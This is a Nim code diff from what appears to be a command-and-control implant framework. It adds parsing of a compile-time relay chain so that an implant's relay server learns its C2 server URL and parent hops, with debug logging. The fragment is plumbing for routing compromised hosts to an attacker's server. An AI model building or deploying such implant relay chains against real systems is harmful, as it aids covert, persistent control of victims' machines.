@@ -71,8 +71,46 @@ proc startRelayServerWithPort*(port: int, implantGuid: string, parentAddr: strin
 # Start HTTP relay server in async mode (compile-time RELAY_PORT)
 proc startRelayServerAsync*(implantGuid: string) {.async.} =
     when RELAY_PORT > 0:
-        # Use compile-time RELAY_PORT
-        discard startRelayServerWithPort(RELAY_PORT, implantGuid)
+        # Extract C2 URL from RELAY_CHAIN if available
+        const RELAY_CHAIN {.strdefine.}: string = ""
+        var c2Url: string = ""
+        var parentChain: string = ""
+        
+        when RELAY_CHAIN != "":
+            parentChain = RELAY_CHAIN
+            when defined debug:
+                echo "[RELAY] 🔗 Compile-time RELAY_CHAIN: " & parentChain
+            
+            # Clean and validate hops (trim whitespace, filter empties)
+            var cleanHops: seq[string] = @[]
+            for hop in parentChain.split(","):
+                let trimmedHop = hop.strip()
+                if trimmedHop.len > 0:
+                    cleanHops.add(trimmedHop)
+            
+            if cleanHops.len > 0:
+                let c2Hop = cleanHops[cleanHops.len - 1]
+                
+                # Check if hop already has protocol
+                if c2Hop.startsWith("http://") or c2Hop.startsWith("https://"):
+                    c2Url = c2Hop
+                else:
+                    # Default to http for compile-time relay
+                    c2Url = "http://" & c2Hop
+                
+                when defined debug:
+                    echo "[RELAY] 🎯 Extracted C2 URL from RELAY_CHAIN: " & c2Url
+            
+        when defined debug:
+            echo "[RELAY] 🚀 Starting compile-time relay server on port " & $RELAY_PORT
+            echo "[RELAY] 🆔 Using implant GUID: " & implantGuid
+            if c2Url != "":
+                echo "[RELAY] 🎯 C2 URL: " & c2Url
+            if parentChain != "":
+                echo "[RELAY] 🔗 Parent chain: " & parentChain
+        
+        # Use compile-time RELAY_PORT with extracted C2 URL
+        discard startRelayServerWithPort(RELAY_PORT, implantGuid, parentChain, c2Url)
     else:
         when defined debug:
             echo "[RELAY] ℹ️  No relay server configured (RELAY_PORT not defined)"
